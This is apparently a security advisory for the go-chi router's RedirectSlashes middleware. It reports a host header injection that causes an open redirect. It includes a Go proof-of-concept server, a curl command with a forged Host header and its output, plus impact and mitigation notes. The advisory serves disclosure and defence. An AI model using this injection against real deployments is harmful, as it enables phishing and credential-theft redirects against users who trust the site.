summary: "chi Allows Host Header Injection which Leads to Open Redirect in RedirectSlashes\n\
  ### Summary\nThe RedirectSlashes function in middleware/strip.go is vulnerable to host header\
  \ injection which leads to open redirect.\n\n### Details\nThe RedirectSlashes method uses\
  \ the Host header to construct the redirectURL at this line https://github.com/go-chi/chi/blob/v5.2.1/middleware/strip.go#L55\n\
  \nThe Host header can be manipulated by a user to be any arbitrary host. This leads to open\
  \ redirect when using the RedirectSlashes middleware\n\n### PoC\nCreate a simple server which\
  \ uses the RedirectSlashes middleware\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\
  \n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\" // Import the\
  \ middleware package\n)\n\nfunc main() {\n\t// Create a new Chi router\n\tr := chi.NewRouter()\n\
  \n\t// Use the built-in RedirectSlashes middleware\n\tr.Use(middleware.RedirectSlashes) //\
  \ Use middleware.RedirectSlashes\n\n\t// Define a route handler\n\tr.Get(\"/\", func(w http.ResponseWriter,\
  \ r *http.Request) {\n\t\t// A simple response\n\t\tw.Write([]byte(\"Hello, World!\"))\n\t\
  })\n\n\t// Start the server\n\tfmt.Println(\"Starting server on :8080\")\n\thttp.ListenAndServe(\"\
  :8080\", r)\n}\n```\nRun the server `go run main.go`\n\nOnce the server is running, send a\
  \ request that will trigger the RedirectSlashes function with an arbitrary Host header\n`curl\
  \ -iL -H \"Host: example.com\" http://localhost:8080/test/`\n\nObserve that the request will\
  \ be redirected to example.com\n\n```\ncurl -L -H \"Host: example.com\" http://localhost:8080/test/\n\
  \n<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"\
  utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n\
  \    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style\
  \ type=\"text/css\">\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n\
  \        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, \"\
  Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n... snipped\
  \ ...\n```\nWithout the host header, the response is returned from the test server\n```\n\
  curl -L http://localhost:8080/test/\n\n404 page not found\n```\n\n### Impact\nAn open redirect\
  \ vulnerability allows attackers to trick users into visiting malicious sites. This can lead\
  \ to phishing attacks, credential theft, and malware distribution, as users trust the applicationâ€™s\
  \ domain while being redirected to harmful sites.\n\n### Potential mitigation\nIt seems that\
  \ the purpose of the RedirectSlashes function is to redirect within the same application.\
  \ In that case r.RequestURI can be used instead of r.Host by default. If there is a use case\
  \ to redirect to a different host, a flag can be added to use the Host header instead. As\
  \ this flag will be controlled by the developer they will make the decision of allowing redirects\
  \ to arbitrary hosts  based on their judgement."
